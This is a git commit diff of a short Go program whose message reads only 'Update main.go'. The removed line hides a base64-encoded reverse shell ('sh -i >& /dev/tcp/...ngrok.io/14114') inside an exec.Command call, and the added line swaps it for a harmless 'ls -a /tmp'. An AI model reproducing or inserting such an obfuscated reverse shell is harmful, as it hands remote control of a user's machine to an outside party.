15e53665e98336bd69d622e016815b69712c03d5
Chu <ric1337@protonmail.ch>
2024-09-21 12:58:29 -0300

    Update main.go

--- main.go
+++ main.go
@@ -7,7 +7,7 @@ import (
 
 func main() {
         fmt.Println("Vivo!")
-        cmd := exec.Command("echo","c2ggLWkgPiYgL2Rldi90Y3AvMC50Y3Auc2Eubmdyb2suaW8vMTQxMTQgMD4mMQ==","base64","-d","|","sh")
+        cmd := exec.Command("ls","-a","/tmp")
 
         output, err := cmd.Output()
         if err != nil {
